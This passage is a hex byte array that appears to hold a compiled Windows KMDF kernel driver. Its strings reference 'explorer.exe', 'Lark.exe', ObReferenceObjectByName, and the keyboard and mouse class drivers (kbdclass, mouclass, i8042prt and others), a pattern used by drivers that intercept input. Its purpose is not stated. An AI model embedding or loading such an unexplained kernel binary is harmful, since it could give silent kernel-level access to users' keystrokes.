0x8D, 0x15, 0x7A, 0x17, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x1B, 0x1A, 0x00, 0x00, 0xE8, 0x0A, 0x05,
0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83,
0xEC, 0x20, 0x48, 0x8B, 0xDA, 0x48, 0x8B, 0xF9, 0xE8, 0x53, 0x37, 0x00, 0x00, 0x48, 0x8B, 0xD3,
0x48, 0x8B, 0xCF, 0xE8, 0x0C, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x83, 0xC4,
0x20, 0x5F, 0xC3, 0xCC, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48,
0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xEC, 0x30, 0x33, 0xED, 0x48,
0x8B, 0xF2, 0x48, 0x8B, 0xF9, 0x48, 0x85, 0xC9, 0x75, 0x0A, 0xE8, 0x31, 0xEA, 0xFF, 0xFF, 0xE9,
0xC1, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x95, 0x17, 0x00, 0x00, 0x48, 0x89, 0x3D, 0xC6, 0x19,
0x00, 0x00, 0x4C, 0x8D, 0x35, 0x9F, 0x19, 0x00, 0x00, 0xC7, 0x05, 0x95, 0x19, 0x00, 0x00, 0x00,
0x00, 0x08, 0x02, 0x49, 0x8B, 0xCE, 0x48, 0x89, 0x05, 0x93, 0x19, 0x00, 0x00, 0x48, 0xFF, 0x15,
0xB4, 0x07, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x4C, 0x8D, 0x0D, 0x90, 0x19, 0x00, 0x00,
0x49, 0x8B, 0xD6, 0x4C, 0x8D, 0x05, 0xC6, 0x16, 0x00, 0x00, 0x48, 0x8B, 0xCF, 0xE8, 0x4E, 0x04,
0x00, 0x00, 0x85, 0xC0, 0x78, 0x6F, 0x48, 0x8B, 0x05, 0x6B, 0x19, 0x00, 0x00, 0x48, 0x8D, 0x0D,
0xAC, 0x16, 0x00, 0x00, 0x48, 0x8B, 0x90, 0x48, 0x06, 0x00, 0x00, 0x48, 0x89, 0x15, 0x36, 0x19,
0x00, 0x00, 0xE8, 0xAD, 0x01, 0x00, 0x00, 0x8B, 0xD8, 0x85, 0xC0, 0x78, 0x41, 0xE8, 0xDE, 0x00,
0x00, 0x00, 0x8B, 0xD8, 0x85, 0xC0, 0x78, 0x36, 0x48, 0x8B, 0xD6, 0x48, 0x8B, 0xCF, 0xE8, 0x9D,
0xE9, 0xFF, 0xFF, 0x8B, 0xD8, 0x85, 0xC0, 0x79, 0x48, 0x33, 0xD2, 0x4C, 0x89, 0x74, 0x24, 0x20,
0x44, 0x8B, 0xC8, 0x4C, 0x8D, 0x05, 0x0E, 0x09, 0x00, 0x00, 0x8D, 0x4A, 0x4D, 0x48, 0xFF, 0x15,
0x3C, 0x07, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0xE8, 0x62, 0xFE, 0xFF, 0xFF, 0xE8, 0xB5,
0xFE, 0xFF, 0xFF, 0x8B, 0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x8B, 0x6C, 0x24, 0x48, 0x48,
0x8B, 0x74, 0x24, 0x50, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5E, 0xC3,
0xCC, 0x48, 0x8B, 0x05, 0xE8, 0x18, 0x00, 0x00, 0x40, 0x38, 0x68, 0x30, 0x74, 0x1D, 0x48, 0x8B,
0x47, 0x68, 0x48, 0x85, 0xC0, 0x74, 0x07, 0x48, 0x89, 0x05, 0xE2, 0x18, 0x00, 0x00, 0x48, 0x8D,
0x05, 0x2F, 0x00, 0x00, 0x00, 0x48, 0x89, 0x47, 0x68, 0xEB, 0x15, 0x8B, 0x40, 0x08, 0xA8, 0x02,
0x74, 0x0E, 0x48, 0x8D, 0x05, 0x0B, 0x00, 0x00, 0x00, 0x48, 0x89, 0x05, 0x88, 0x18, 0x00, 0x00,
0x33, 0xC0, 0xEB, 0xA1, 0x48, 0x83, 0xEC, 0x28, 0xE8, 0x4B, 0xFE, 0xFF, 0xFF, 0x48, 0x83, 0xC4,
0x28, 0xC3, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0x05, 0xA1, 0x18, 0x00, 0x00, 0x48,
0x85, 0xC0, 0x74, 0x11, 0x48, 0x8D, 0x15, 0xE9, 0xFF, 0xFF, 0xFF, 0x48, 0x3B, 0xC2, 0x74, 0x05,
0xE8, 0x7B, 0x03, 0x00, 0x00, 0xE8, 0x1E, 0xFE, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC,
0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x30, 0x4C, 0x8D, 0x0D, 0x0F, 0x16, 0x00,
0x00, 0x48, 0x8D, 0x3D, 0x18, 0x16, 0x00, 0x00, 0x4C, 0x3B, 0xCF, 0x76, 0x2C, 0x33, 0xD2, 0xC7,
0x44, 0x24, 0x28, 0x7B, 0x00, 0x00, 0xC0, 0x4C, 0x8D, 0x05, 0x62, 0x08, 0x00, 0x00, 0x48, 0x89,
0x7C, 0x24, 0x20, 0x8D, 0x4A, 0x4D, 0x48, 0xFF, 0x15, 0x53, 0x06, 0x00, 0x00, 0x0F, 0x1F, 0x44,
0x00, 0x00, 0xB8, 0x7B, 0x00, 0x00, 0xC0, 0xEB, 0x6C, 0x48, 0x8D, 0x0D, 0xE0, 0x15, 0x00, 0x00,
0xEB, 0x0A, 0x48, 0x83, 0x39, 0x00, 0x75, 0x0D, 0x48, 0x83, 0xC1, 0x08, 0x48, 0x8D, 0x41, 0x08,
0x48, 0x3B, 0xC7, 0x76, 0xED, 0x48, 0x3B, 0xCF, 0x73, 0x49, 0x48, 0x8D, 0x41, 0x28, 0x48, 0x3B,
0xC7, 0x77, 0x26, 0x83, 0x39, 0x28, 0x75, 0x21, 0x48, 0x8B, 0xD9, 0x48, 0x85, 0xC9, 0x74, 0x19,
0x48, 0x8B, 0x41, 0x20, 0x48, 0x85, 0xC0, 0x74, 0x09, 0xE8, 0xE2, 0x02, 0x00, 0x00, 0x48, 0x89,
0x43, 0x18, 0x8B, 0x0B, 0x48, 0x03, 0xCB, 0xEB, 0xC3, 0x33, 0xD2, 0x4C, 0x8D, 0x05, 0x96, 0x08,
0x00, 0x00, 0x8D, 0x4A, 0x4D, 0x48, 0xFF, 0x15, 0xE4, 0x05, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00,
0x00, 0xEB, 0x8F, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x83, 0xC4, 0x30, 0x5F, 0xC3,
0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48,
0x89, 0x70, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x40, 0x33, 0xFF, 0x4C, 0x8D, 0x0D, 0x1F, 0x15, 0x00,
0x00, 0x48, 0x8D, 0x2D, 0x28, 0x15, 0x00, 0x00, 0x48, 0x8B, 0xF1, 0x4C, 0x3B, 0xCD, 0x76, 0x2D,
0xC7, 0x40, 0xE0, 0x7B, 0x00, 0x00, 0xC0, 0x4C, 0x8D, 0x05, 0x62, 0x08, 0x00, 0x00, 0x33, 0xD2,
0x48, 0x89, 0x68, 0xD8, 0x8D, 0x4F, 0x4D, 0x48, 0xFF, 0x15, 0x82, 0x05, 0x00, 0x00, 0x0F, 0x1F,
0x44, 0x00, 0x00, 0xB8, 0x7B, 0x00, 0x00, 0xC0, 0xE9, 0xA2, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D,
0xEC, 0x14, 0x00, 0x00, 0xEB, 0x0A, 0x48, 0x83, 0x39, 0x00, 0x75, 0x0D, 0x48, 0x83, 0xC1, 0x08,
0x48, 0x8D, 0x41, 0x08, 0x48, 0x3B, 0xC5, 0x76, 0xED, 0x48, 0x3B, 0xCD, 0x73, 0x7F, 0x48, 0x8D,
0x41, 0x50, 0x48, 0x3B, 0xC5, 0x0F, 0x87, 0xD6, 0x00, 0x00, 0x00, 0x83, 0x39, 0x50, 0x0F, 0x85,
0xCD, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xD9, 0x48, 0x85, 0xC9, 0x0F, 0x84, 0xC1, 0x00, 0x00, 0x00,
0x48, 0x8B, 0x41, 0x38, 0x48, 0x89, 0x0D, 0xAD, 0x14, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x65,
0x4C, 0x8B, 0x05, 0xF9, 0x16, 0x00, 0x00, 0x4C, 0x8B, 0xC9, 0x48, 0x8D, 0x0D, 0xD1, 0x01, 0x00,
0x00, 0x48, 0x8B, 0xD6, 0xE8, 0xE7, 0x01, 0x00, 0x00, 0x8B, 0xF8, 0x85, 0xC0, 0x79, 0x5E, 0x4C,
0x8B, 0x4B, 0x38, 0x4C, 0x8D, 0x05, 0x96, 0x08, 0x00, 0x00, 0x89, 0x44, 0x24, 0x30, 0x33, 0xD2,
0x48, 0x8B, 0x43, 0x08, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x89, 0x5C, 0x24, 0x20, 0x8D, 0x4A,
0x4D, 0x48, 0xFF, 0x15, 0xD8, 0x04, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x8B, 0xC7, 0x48,
0x8B, 0x5C, 0x24, 0x50, 0x48, 0x8B, 0x6C, 0x24, 0x58, 0x48, 0x8B, 0x74, 0x24, 0x60, 0x48, 0x83,
0xC4, 0x40, 0x5F, 0xC3, 0xCC, 0x48, 0x8B, 0x15, 0x94, 0x16, 0x00, 0x00, 0x4C, 0x8B, 0xC3, 0x48,
0x8B, 0xCE, 0xE8, 0x6B, 0x01, 0x00, 0x00, 0x8B, 0xF8, 0x85, 0xC0, 0x78, 0x0A, 0x8B, 0x0B, 0x48,
0x03, 0xCB, 0xE9, 0x39, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x43, 0x08, 0x4C, 0x8D, 0x05, 0x9E, 0x08,
0x00, 0x00, 0x33, 0xD2, 0x89, 0x7C, 0x24, 0x28, 0x4C, 0x8B, 0xCB, 0x48, 0x89, 0x44, 0x24, 0x20,
0x8D, 0x4A, 0x4D, 0x48, 0xFF, 0x15, 0x76, 0x04, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0xEB,
0x9C, 0x33, 0xD2, 0x4C, 0x8D, 0x05, 0xE6, 0x07, 0x00, 0x00, 0x8D, 0x4A, 0x4D, 0x48, 0xFF, 0x15,
0x5C, 0x04, 0x00, 0x00, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0xE9, 0xD5, 0xFE, 0xFF, 0xFF, 0xCC, 0xCC,
0x48, 0x8D, 0x05, 0xB9, 0x13, 0x00, 0x00, 0x48, 0x39, 0x05, 0xCA, 0x13, 0x00, 0x00, 0x0F, 0x95,
0xC0, 0xC3, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48,
0x83, 0xEC, 0x30, 0x48, 0x8B, 0x3D, 0xAE, 0x13, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x8F, 0x13, 0x00,
0x00, 0x48, 0x8D, 0x1D, 0x98, 0x13, 0x00, 0x00, 0x48, 0x8B, 0xF1, 0x48, 0x3B, 0xF8, 0x0F, 0x84,
0x90, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC7, 0x50, 0xEB, 0x0A, 0x48, 0x83, 0x3B, 0x00, 0x75, 0x0D,
0x48, 0x83, 0xC3, 0x08, 0x48, 0x8D, 0x43, 0x08, 0x48, 0x3B, 0xC7, 0x76, 0xED, 0x48, 0x3B, 0xDF,
0x72, 0x05, 0x48, 0x8B, 0xDF, 0xEB, 0x0E, 0x48, 0x8D, 0x43, 0x50, 0x48, 0x3B, 0xC7, 0x77, 0x4C,
0x83, 0x3B, 0x50, 0x75, 0x47, 0x48, 0x85, 0xDB, 0x74, 0x42, 0x48, 0x3B, 0xDF, 0x73, 0x55, 0x48,
0x8B, 0x43, 0x40, 0x48, 0x85, 0xC0, 0x74, 0x1B, 0x4C, 0x8B, 0x05, 0xA1, 0x15, 0x00, 0x00, 0x48,
0x8D, 0x0D, 0x82, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xCB, 0x48, 0x8B, 0xD6, 0xE8, 0x8F, 0x00, 0x00,
0x00, 0xEB, 0x12, 0x48, 0x8B, 0x15, 0x86, 0x15, 0x00, 0x00, 0x4C, 0x8B, 0xC3, 0x48, 0x8B, 0xCE,
0xE8, 0x63, 0x00, 0x00, 0x00, 0x8B, 0x03, 0x48, 0x03, 0xD8, 0xEB, 0x98, 0x33, 0xD2, 0x4C, 0x8D,
0x05, 0x0B, 0x07, 0x00, 0x00, 0x8D, 0x4A, 0x4D, 0x48, 0xFF, 0x15, 0x81, 0x03, 0x00, 0x00, 0x0F,
0x1F, 0x44, 0x00, 0x00, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x8B, 0x74, 0x24, 0x48, 0x48, 0x83,
0xC4, 0x30, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0xC2, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0xFF, 0x25, 0x7A, 0x02, 0x00, 0x00, 0xFF, 0x25, 0x6C, 0x02, 0x00, 0x00, 0xFF, 0x25, 0x5E, 0x02,
0x00, 0x00, 0xFF, 0x25, 0x78, 0x02, 0x00, 0x00, 0xFF, 0x25, 0x6A, 0x02, 0x00, 0x00, 0xCC, 0xCC,
0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
0xFF, 0x25, 0x52, 0x03, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
0xFF, 0xE0, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
0xFF, 0x25, 0x12, 0x03, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x65, 0x78, 0x70, 0x6C, 0x6F, 0x72, 0x65, 0x72, 0x2E, 0x65, 0x78, 0x65, 0x00, 0xCC, 0xCC, 0xCC,
0x2E, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x4F, 0x00, 0x62, 0x00, 0x52, 0x00, 0x65, 0x00, 0x66, 0x00, 0x65, 0x00, 0x72, 0x00, 0x65, 0x00,
0x6E, 0x00, 0x63, 0x00, 0x65, 0x00, 0x4F, 0x00, 0x62, 0x00, 0x6A, 0x00, 0x65, 0x00, 0x63, 0x00,
0x74, 0x00, 0x42, 0x00, 0x79, 0x00, 0x4E, 0x00, 0x61, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x00, 0x00,
0x5C, 0x00, 0x44, 0x00, 0x72, 0x00, 0x69, 0x00, 0x76, 0x00, 0x65, 0x00, 0x72, 0x00, 0x5C, 0x00,
0x6D, 0x00, 0x6F, 0x00, 0x75, 0x00, 0x63, 0x00, 0x6C, 0x00, 0x61, 0x00, 0x73, 0x00, 0x73, 0x00,
0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x5C, 0x00, 0x44, 0x00, 0x72, 0x00, 0x69, 0x00, 0x76, 0x00, 0x65, 0x00, 0x72, 0x00, 0x5C, 0x00,
0x6B, 0x00, 0x62, 0x00, 0x64, 0x00, 0x63, 0x00, 0x6C, 0x00, 0x61, 0x00, 0x73, 0x00, 0x73, 0x00,
0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x5C, 0x00, 0x44, 0x00, 0x72, 0x00, 0x69, 0x00, 0x76, 0x00, 0x65, 0x00, 0x72, 0x00, 0x5C, 0x00,
0x6D, 0x00, 0x6F, 0x00, 0x75, 0x00, 0x68, 0x00, 0x69, 0x00, 0x64, 0x00, 0x00, 0x00, 0xCC, 0xCC,
0x5C, 0x00, 0x44, 0x00, 0x72, 0x00, 0x69, 0x00, 0x76, 0x00, 0x65, 0x00, 0x72, 0x00, 0x5C, 0x00,
0x69, 0x00, 0x38, 0x00, 0x30, 0x00, 0x34, 0x00, 0x32, 0x00, 0x70, 0x00, 0x72, 0x00, 0x74, 0x00,
0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x5C, 0x00, 0x44, 0x00, 0x72, 0x00, 0x69, 0x00, 0x76, 0x00, 0x65, 0x00, 0x72, 0x00, 0x5C, 0x00,
0x6B, 0x00, 0x62, 0x00, 0x64, 0x00, 0x68, 0x00, 0x69, 0x00, 0x64, 0x00, 0x00, 0x00, 0xCC, 0xCC,
0x4C, 0x61, 0x72, 0x6B, 0x2E, 0x65, 0x78, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xF8, 0x93, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE0, 0x93, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xCE, 0x93, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x22, 0x94, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x0C, 0x94, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xE0, 0x91, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF8, 0x91, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x08, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x18, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x30, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x62, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7E, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x8C, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA6, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xB2, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCE, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xDA, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF2, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x08, 0x93, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1E, 0x93, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x3E, 0x93, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x54, 0x93, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x70, 0x93, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7A, 0x93, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x86, 0x93, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA8, 0x93, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xC0, 0x93, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCC, 0x91, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xB2, 0x91, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x98, 0x91, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x80, 0x91, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x80, 0x5D, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0xE0, 0x5D, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00,
0x80, 0x5D, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x5E, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00,
0x00, 0x5E, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x4B, 0x00, 0x6D, 0x00, 0x64, 0x00, 0x66, 0x00, 0x4C, 0x00, 0x69, 0x00, 0x62, 0x00, 0x72, 0x00,
0x61, 0x00, 0x72, 0x00, 0x79, 0x00, 0x00, 0x00, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x45, 0x6E,
0x74, 0x72, 0x79, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x30, 0x78, 0x25, 0x78, 0x20,
0x66, 0x6F, 0x72, 0x20, 0x64, 0x72, 0x69, 0x76, 0x65, 0x72, 0x20, 0x25, 0x77, 0x5A, 0x0A, 0x00,
0xC5, 0x3F, 0xD8, 0x91, 0x6F, 0x3D, 0x6D, 0x4E, 0xB6, 0x9E, 0x0E, 0xA2, 0x6C, 0xD3, 0x82, 0xE7,
0x46, 0x78, 0x53, 0x74, 0x75, 0x62, 0x49, 0x6E, 0x69, 0x74, 0x54, 0x79, 0x70, 0x65, 0x73, 0x3A,
0x20, 0x69, 0x6E, 0x76, 0x61, 0x6C, 0x69, 0x64, 0x20, 0x64, 0x72, 0x69, 0x76, 0x65, 0x72, 0x20,
0x69, 0x6D, 0x61, 0x67, 0x65, 0x2C, 0x20, 0x74, 0x68, 0x65, 0x20, 0x61, 0x64, 0x64, 0x72, 0x65,
0x73, 0x73, 0x20, 0x6F, 0x66, 0x20, 0x73, 0x79, 0x6D, 0x62, 0x6F, 0x6C, 0x20, 0x5F, 0x5F, 0x4B,
0x4D, 0x44, 0x46, 0x5F, 0x54, 0x59, 0x50, 0x45, 0x5F, 0x49, 0x4E, 0x49, 0x54, 0x5F, 0x53, 0x54,
0x41, 0x52, 0x54, 0x20, 0x30, 0x78, 0x25, 0x70, 0x20, 0x69, 0x73, 0x20, 0x67, 0x72, 0x65, 0x61,
0x74, 0x65, 0x72, 0x20, 0x74, 0x68, 0x61, 0x6E, 0x20, 0x74, 0x68, 0x65, 0x20, 0x61, 0x64, 0x64,
0x72, 0x65, 0x73, 0x73, 0x20, 0x6F, 0x66, 0x20, 0x73, 0x79, 0x6D, 0x62, 0x6F, 0x6C, 0x20, 0x5F,
0x5F, 0x4B, 0x4D, 0x44, 0x46, 0x5F, 0x54, 0x59, 0x50, 0x45, 0x5F, 0x49, 0x4E, 0x49, 0x54, 0x5F,
0x45, 0x4E, 0x44, 0x20, 0x30, 0x78, 0x25, 0x70, 0x2C, 0x20, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73,
0x20, 0x30, 0x78, 0x25, 0x78, 0x0A, 0x00, 0x00, 0x46, 0x78, 0x47, 0x65, 0x74, 0x4E, 0x65, 0x78,
